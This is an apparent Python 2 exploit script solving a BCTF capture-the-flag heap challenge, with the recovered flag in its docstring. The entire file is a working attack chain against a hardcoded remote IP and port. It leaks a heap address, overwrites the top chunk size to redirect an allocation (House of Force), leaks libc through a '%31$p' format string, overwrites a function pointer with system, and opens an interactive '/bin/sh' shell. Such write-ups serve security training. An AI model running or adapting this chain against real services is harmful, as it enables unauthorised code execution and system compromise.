from pwnlib import *

"""
BCTF{3asy_h0uSe_oooof_f0rce}
"""
# LOCAL
libc_start_main_offset = 0x19a63 # SPECIAL
system_offset = 0x3fcd0

# REMOTE
libc_start_main_offset = 0x00019a83 # SPECIAL
system_offset = 0x40190

name = "A"*0x40
org = "B"*0x40
host = "\xff"*4 + "C"*0x3c

def clear():
	return s.ru(">>\n")


#s = Socket(("localhost", 4442))
s = Socket(("104.199.132.199", 1970))

raw_input("> ")

s.ru("name")
s.send(name)
s.ru("A"*0x40)
heap_base = ud(s.recv(4)) - 8
print "heap: 0x%x" % heap_base

s.ru("Org")
s.send(org)
s.ru("Host")
s.send(host)
print clear()

target = 0x804b050
size = target - (heap_base + 0xfc) - 4
print "size: %d" % size

s.send("1\n")
s.ru("content:")
s.send("%d\n" % size)
clear()

s.send("1\n")
s.ru("content")
s.send("16\n")
s.ru("content")
s.send("CCCC" + pd(0x080484d6) + "\n")
clear()

s.send("|%31$p|\n")
libc_base = int(clear().split("|")[1], 16) - libc_start_main_offset
print "libc: 0x%x" % libc_base
assert libc_base & 0xfff == 0

s.send("333\n")
s.ru("id")
s.send("1\n")
s.ru("content")
system = libc_base + system_offset
s.send("AAAA" + pd(system) + "\n")
clear()


s.send("/bin/sh\n")
print "shell?"
s.send("pwd\n")






s.interact()

